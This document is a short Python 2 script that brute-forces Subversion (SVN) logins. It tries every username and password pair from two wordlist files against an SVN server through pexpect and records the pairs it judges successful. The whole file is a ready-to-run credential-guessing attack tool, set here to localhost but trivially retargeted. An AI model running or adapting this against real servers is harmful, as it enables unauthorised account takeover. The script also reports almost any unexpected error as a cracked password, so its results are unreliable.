#!/usr/bin/python
#coding:utf-8
#auth:Devotes

import pexpect
import re

f=open('user.txt','r')
fp=open('password.txt','r')
fs=open('result/success.txt','w')
fl=open('result/log.txt','a')

listuser=[]
listpassword=[]

for u in f:
	listuser.append(u.strip('\r\n'))
for p in fp:
	listpassword.append(p.strip('\r\n'))

def svn_burp():
	for username in listuser:
		print '[*]testing '+username
		fl.write('\r\n[*]testing '+username+'\r\n')
		if username =='':
			continue
		for password in listpassword:
			cmd='svn co svn://127.0.0.1 --username='+username+' --password='+password
			shell=pexpect.spawn(cmd)
			try:
				error=shell.expect('Username')
				if(error==0):
					shell.sendline(username)
					shell.expect('Password')
					shell.sendline(password)
					shell.expect('Username')
					shell.sendline(username)
					shell.expect('Password')
					shell.sendline(password)
					try:
						err=shell.expect("Username")
						if(err==0):
							print username+' Username no found'
							fl.write(username+' Username no found'+'\r\n')
							break
					except Exception,e:
						#print username+' password error'
						fl.write(username+' password error'+'\r\n')
			except Exception,e:
						r=re.compile(r'Connection refused')
						ex=r.findall(str(e))
						if ex:						
							print 'Connection refused'
						else:
							print username+' password is '+password
							fs.write(username+' password is '+password+'\r\n')
							fl.write(username+' password is '+password+'\r\n')
						break

if __name__ == '__main__':
	svn_burp()
